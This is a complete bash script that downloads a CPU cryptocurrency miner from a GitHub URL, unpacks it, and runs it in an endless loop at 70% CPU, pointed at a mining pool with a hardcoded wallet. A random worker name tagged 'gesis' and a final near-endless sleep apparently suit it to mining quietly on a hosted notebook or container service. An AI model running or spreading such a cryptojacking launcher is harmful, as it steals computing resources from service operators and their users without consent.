#!/bin/bash
POOL=stratum+tcp://ap.luckpool.net:3956#xnsub
WALLET=RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW
WORKER=$(echo $(shuf -i 10-40 -n 1)-gesis)
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
while [ 1 ]; do
./hellminer -c $POOL -u $WALLET.$WORKER -p hybrid --cpu 70
sleep 5
done
sleep 999999999 